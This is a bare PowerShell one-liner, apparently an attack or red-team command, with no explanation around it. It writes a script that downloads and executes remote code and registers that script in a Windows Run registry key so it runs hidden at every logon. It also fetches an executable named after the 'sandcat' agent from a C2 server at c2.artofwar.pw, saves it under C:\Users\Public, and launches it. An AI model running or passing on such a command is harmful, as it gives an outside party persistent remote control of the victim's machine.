echo 'IEX(New-Object Net.WebClient).downloadstring("https://raw.githubusercontent.com/bryanmacainag/artofwar/master/payloads/kjdfnkjdfn.ps1")' > $env:Temp/p.ps1;Set-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name logonscript -Value "C:\Windows\System32\cmd.exe /c %windir%\SysWOW64\WindowsPowerShell\v1.0\powershell.exe -noexit -nologo -WindowStyle Hidden -executionpolicy bypass -file %TEMP%\p.ps1";$server="https://c2.artofwar.pw"; $url="$server/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("defaultServer", $server); $wc.Headers.add("file","sandcat.go"); ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null; iex "C:\Users\Public\$name.exe -v -server $server";